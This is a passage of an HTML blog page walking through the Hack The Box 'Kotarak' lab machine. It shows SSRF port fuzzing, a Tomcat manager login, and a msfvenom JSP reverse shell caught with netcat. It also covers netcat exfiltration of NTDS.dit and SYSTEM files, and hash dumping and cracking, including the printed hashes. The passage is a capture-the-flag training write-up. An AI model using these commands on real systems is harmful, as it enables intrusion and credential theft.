@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Kotarak - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Kotarak"><a href="#Hack-The-Box-Kotarak" class="headerlink" title="Hack The Box - Kotarak"></a>Hack The Box - Kotarak</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Kotarak focuses on many different attack vectors and requires quite a few steps for completion. It is a great learning experience as many of the topics are not covered by other machines on Hack The Box. Its IP address is <code>10.10.10.51</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/kotarak/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#nmap -p- -T 5 -oA allports 10.10.10.55
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 19:37 EDT
+ Stats: 0:04:30 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+ SYN Stealth Scan Timing: About 80.06% done; ETC: 19:43 (0:01:07 remaining)
+ Nmap scan report for 10.10.10.55
+ Host is up (0.11s latency).
+ Not shown: 65531 closed ports
+ PORT      STATE SERVICE
+ 22/tcp    open  ssh
+ 8009/tcp  open  ajp13
+ 8080/tcp  open  http-proxy
+ 60000/tcp open  unknown
+ 
+ Nmap done: 1 IP address (1 host up) scanned in 347.88 seconds<br></figure></pre>
+ <p>Extract in a file the ports, for scan vulnerability with nmap.
+ <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#nmap -sC -sV -p 22,60000,8009,8080 --script vuln 10.10.10.55
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 19:50 EDT
+ Host is up (0.11s latency).
+ 
+ PORT      STATE SERVICE VERSION
+ 22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 8080/tcp  open  http    Apache Tomcat 8.5.5
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /examples/: Sample scripts
+ |   	: Apache Tomcat (401 )
+ |_  /manager/html: Apache Tomcat (401 )
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ | vulners:
+ |   cpe:/a:apache:tomcat:8.5.5:
+ |       CVE-2019-0232   9.3     https://vulners.com/cve/CVE-2019-0232
+ |       CVE-2020-1938   7.5     https://vulners.com/cve/CVE-2020-1938
+ |       CVE-2018-8014   7.5     https://vulners.com/cve/CVE-2018-8014
+ |       CVE-2017-5651   7.5     https://vulners.com/cve/CVE-2017-5651
+ |       CVE-2016-8735   7.5     https://vulners.com/cve/CVE-2016-8735
+ |       CVE-2017-12617  6.8     https://vulners.com/cve/CVE-2017-12617
+ |       CVE-2016-6816   6.8     https://vulners.com/cve/CVE-2016-6816
+ |       CVE-2017-5648   6.4     https://vulners.com/cve/CVE-2017-5648
+ |       CVE-2020-1935   5.8     https://vulners.com/cve/CVE-2020-1935
+ |       CVE-2019-17563  5.1     https://vulners.com/cve/CVE-2019-17563
+ |       CVE-2020-1745   5.0     https://vulners.com/cve/CVE-2020-1745
+ |       CVE-2019-10072  5.0     https://vulners.com/cve/CVE-2019-10072
+ |       CVE-2019-0199   5.0     https://vulners.com/cve/CVE-2019-0199
+ |       CVE-2018-8034   5.0     https://vulners.com/cve/CVE-2018-8034
+ |       CVE-2018-1336   5.0     https://vulners.com/cve/CVE-2018-1336
+ |       CVE-2017-7675   5.0     https://vulners.com/cve/CVE-2017-7675
+ |       CVE-2017-5664   5.0     https://vulners.com/cve/CVE-2017-5664
+ |       CVE-2017-5650   5.0     https://vulners.com/cve/CVE-2017-5650
+ |       CVE-2017-5647   5.0     https://vulners.com/cve/CVE-2017-5647
+ |       CVE-2016-8745   5.0     https://vulners.com/cve/CVE-2016-8745
+ |       CVE-2016-6817   5.0     https://vulners.com/cve/CVE-2016-6817
+ |       CVE-2020-9484   4.4     https://vulners.com/cve/CVE-2020-9484
+ |       CVE-2019-12418  4.4     https://vulners.com/cve/CVE-2019-12418
+ |       CVE-2019-0221   4.3     https://vulners.com/cve/CVE-2019-0221
+ |       CVE-2018-8037   4.3     https://vulners.com/cve/CVE-2018-8037
+ |       CVE-2018-1304   4.3     https://vulners.com/cve/CVE-2018-1304
+ |       CVE-2018-11784  4.3     https://vulners.com/cve/CVE-2018-11784
+ |       CVE-2017-7674   4.3     https://vulners.com/cve/CVE-2017-7674
+ |_      CVE-2018-1305   4.0     https://vulners.com/cve/CVE-2018-1305
+ 60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ | http-csrf:
+ | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.55
+ |   Found the following possible CSRF vulnerabilities:
+ |
+ |     Path: http://10.10.10.55:60000/
+ |     Form id:
+ |_    Form action: url.php
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |_  /info.php: Possible information file
+ |_http-server-header: Apache/2.4.18 (Ubuntu)
+ | http-slowloris-check:
+ |   VULNERABLE:
+ |   Slowloris DOS attack
+ |     State: LIKELY VULNERABLE
+ |     IDs:  CVE:CVE-2007-6750
+ |       Slowloris tries to keep many connections to the target web server open and hold
+ |       them open as long as possible.  It accomplishes this by opening connections to
+ |       the target web server and sending a partial request. By doing so, it starves
+ |       the http server's resources causing Denial Of Service.
+ |
+ |     Disclosure date: 2009-09-17
+ |     References:
+ |       http://ha.ckers.org/slowloris/
+ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ | vulners:
+ |   cpe:/a:apache:http_server:2.4.18:
+ |       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
+ |       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
+ |       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
+ |       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
+ |       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
+ |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+ |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+ |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+ |       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
+ |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+ |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+ |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+ |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+ |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+ |       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
+ |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+ |       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
+ |       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
+ |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+ |       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
+ |       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
+ |       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
+ |       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
+ |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+ |       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
+ |       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
+ |       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
+ |       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+ |_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 580.61 seconds<br></figure></pre>
+ <p>The output shown some folder over 8080 and 60000 http port.
+ <h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+ <p>In the web browser, /manager/html/upload.
+  <img src="/images/hackthebox/exploit/kotarak/1.png" alt=""></p>
+ <p>Info.php page.
+  <img src="/images/hackthebox/exploit/kotarak/2.png" alt=""></p>
+ <p>web page 10.10.10.55:60000
+  <img src="/images/hackthebox/exploit/kotarak/3.png" alt=""></p>
+ <p>This page, looks like vulnerability SSRF "Server Side Request Forgery", this vulnerability allow to attack, enumerate internal server from you loopback ip address 127.0.0.1. With <code>wfuzz</code> in Kali linux, launch this attack.
+ 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ
+ 
+ Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+ 
+ ********************************************************
+ * Wfuzz 2.4.5 - The Web Fuzzer                         *
+ ********************************************************
+ 
+ Target: http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ
+ Total requests: 65535
+ 
+ ===================================================================
+ ID           Response   Lines    Word     Chars       Payload
+ ===================================================================
+ 
+ 000000022:   200        4 L      4 W      62 Ch       "22"
+ 000000090:   200        11 L     18 W     156 Ch      "90"
+ 000000110:   200        17 L     24 W     187 Ch      "110"
+ 000000200:   200        3 L      2 W      22 Ch       "200"
+ 000000320:   200        26 L     109 W    1232 Ch     "320"
+ 000000888:   200        78 L     265 W    3955 Ch     "888"
+ 000060000:   200        78 L     130 W    1171 Ch     "60000"
+ 
+ Total time: 750.9632
+ Processed Requests: 65535
+ Filtered Requests: 65528
+ Requests/sec.: 87.26791<br></figure></pre>
+ <p>The output wfuzz show the open ports, like a 888. In the web browser http://10.10.10.55:60000/url.php?path=127.0.0.1:888
+  <img src="/images/hackthebox/exploit/kotarak/4.png" alt=""></p>
+  <p>When clic in <code>Backup</code>,not show data.
+ <img src="/images/hackthebox/exploit/kotarak/5.png" alt=""></p>
+ <p>But with <code>CRTL + U</code> show the way to open.
+  <img src="/images/hackthebox/exploit/kotarak/4.1.png" alt=""></p>
+ <p>The Backup file in the web page, show the user admin with the password.
+  <img src="/images/hackthebox/exploit/kotarak/6.png" alt=""></p>
+  <p>The user and password allow to authenticate in the Tomcat manager
+  <img src="/images/hackthebox/exploit/kotarak/7.png" alt=""></p>
+  <p>Build the reverse code in the Kali Linux <code>msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.27 lport=4447 -f war > diego.war</code> for reverse conection.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.27 lport=4447 -f w
+ ar > diego.war
+ Payload size: 1104 bytes
+ Final size of war file: 1104 bytes <br></figure></pre>
+ <p>Upload the file created in the manager Tomacat.
+ <img src="/images/hackthebox/exploit/kotarak/8.png" alt=""></p>
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>Run the netcat in Kali linux machine and Launch the exploit from the web browser.
+   <img src="/images/hackthebox/exploit/kotarak/9.png" alt=""></p>
+ <p>Run the ncat listen over 4447 port.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#nc -nvlp 4447
+ listening on [any] 4447 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 49910
+ whereis python3
+ python3: /usr/bin/python3.5 /usr/bin/python3.5m /usr/bin/python3 /usr/lib/python3.5 /usr/lib/python3 /etc/python3.5 /etc/python3 /usr/local/lib/python3.5 /usr/share/python3 /usr/share/man/man1/python3.1.gz
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
+ tomcat@kotarak-dmz:/$ id
+ id
+ uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+ tomcat@kotarak-dmz:/$ <br></figure></pre>
+ <p>From kali linux was downloaded the LinEnum.sh script for search vulnerabilities, but was unsuccessfully because not shown any.
+<pre><figure class="highlight plain"> tomcat@kotarak-dmz:/home/tomcat/to_archive$ cd /tmp
+ cd /tmp
+ tomcat@kotarak-dmz:/tmp$ curl 10.10.14.27/LinEnum.sh -o enum.sh
+ curl 10.10.14.27/LinEnum.sh -o enum.sh
+   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                  Dload  Upload   Total   Spent    Left  Speed
+ 100 46631  100 46631    0     0   105k      0 --:--:-- --:--:-- --:--:--  105k
+ tomcat@kotarak-dmz:/tmp$ chmod +x enum.sh
+ chmod +x enum.sh
+ tomcat@kotarak-dmz:/tmp$ <br></figure></pre>
+ <p>In the home folder tomcat, was found 2 files <code>.bin & . dit</code> this files has data about users and password from loggins.
+ <pre><figure class="highlight plain"> tomcat@kotarak-dmz:/dev/shm$ cd /home/tomcat/
+ tomcat@kotarak-dmz:/home/tomcat$ ls
+ to_archive
+ tomcat@kotarak-dmz:/home/tomcat$ cd to_archive/
+ tomcat@kotarak-dmz:/home/tomcat/to_archive$ ls
+ pentest_data
+ tomcat@kotarak-dmz:/home/tomcat/to_archive$ cd pentest_data/
+ tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls
+ 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+ 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+ tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$<br></figure></pre>
+ <p>Download the files in Kali linux with netcat. From kotorak, for first file .bin launch <code>nc 10.10.14.27 4448 < file.bin</code> and from Kali linux run nc listener with the name for output file, in this case the file.bin will become in SYSTEM name file.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#nc -nvlp 4448 > SYSTEM
+ listening on [any] 4448 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 49196
+ |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#nc -nvlp 4448 > ntds.dit
+ listening on [any] 4448 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 49200
+ |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#ls
+ diego.war  ntds.dit  ntdsxtract  SYSTEM<br></figure></pre>
+ <p>There are two files, the ntds.bin and SYSTEM.
+ <p>Now, need to extract the hash with impacket.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#impacket-secretsdump  -ntds ntds.dit -system SYSTEM  LOCAL
+ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+ 
+ [*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
+ [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+ [*] Searching for pekList, be patient
+ [*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
+ [*] Reading and decrypting hashes from ntds.dit
+ Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
+ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
+ WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
+ WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
+ WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
+ WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
+ atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+ [*] Kerberos keys from ntds.dit
+ Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
+ Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
+ Administrator:des-cbc-md5:75375eda54757c2f
+ WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
+ WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
+ WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
+ WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
+ krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
+ krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
+ krbtgt:des-cbc-md5:10ef08047a862046
+ krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
+ WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
+ WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
+ WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
+ WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
+ WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
+ WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
+ WINXP1$:des-cbc-md5:984a40d5f4a815f2
+ WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
+ WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
+ WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
+ WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
+ WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
+ WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
+ WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
+ WIN7$:des-cbc-md5:89a1673723ad9180
+ WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
+ atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
+ atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
+ atanas:des-cbc-md5:6b80e391f113542a
+ [*] Cleaning up...<br></figure></pre>
+ <p>Copy and paste the main hashes and crack with <code>john</code>.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#cat hash
+ Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+ atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+ |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#awk -F: '{print $4}' hash > hash2
+ e64fe0f24ba2489c05e64354d74ebd11
+ 2b576acbe6bcfda7294d6bd18041b8fe
+ |-------(root@kali)-------|(~/HackTheBox/kotarak)
+ |
+ |-->{SFire129}#john --wordlist=passwords.txt hash2 --format=NT
+ Using default input encoding: UTF-8
+ Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
+ Remaining 1 password hash
+ Warning: no OpenMP support for this hash type, consider --fork=4
+ Press 'q' or Ctrl-C to abort, almost any other key for status
+ Warning: Only 2 candidates left, minimum 12 needed for performance.
+ Password123!     (atanas)
+ 1g 0:00:00:00 DONE (2020-06-11 11:36) 100.0g/s 200.0p/s 200.0c/s 200.0C/s Password123!..f16tomcat!
+ Use the "--show --format=NT" options to display all of the cracked passwords reliably
+ Session completed<br></figure></pre>
+ <p>We have 2 passwords, for user administrator is Password123! and for user atanas the password is f16tomcat!
+ <pre><figure class="highlight plain"> tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ su - atanas
+Password:
+atanas@kotarak-dmz:~$<br></figure></pre>
+<p>Enumerating into the user atanas found a file app.log with information very interesting, the version from wget program is 1.16, this version is vulnerable.
+<pre><figure class="highlight plain"> atanas@kotarak-dmz:~$ id
+ uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)
+ atanas@kotarak-dmz:~$ cd /root
+ atanas@kotarak-dmz:/root$ ls
+  app.log  flag.txt
+ atanas@kotarak-dmz:/root$ cat flag.txt
+ cat flag.txt
+ Getting closer! But what you are looking for can't be found here.
+ atanas@kotarak-dmz:/root$cat app.log | more
+ cat app.log | more
+ 10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+ 10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+ 10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
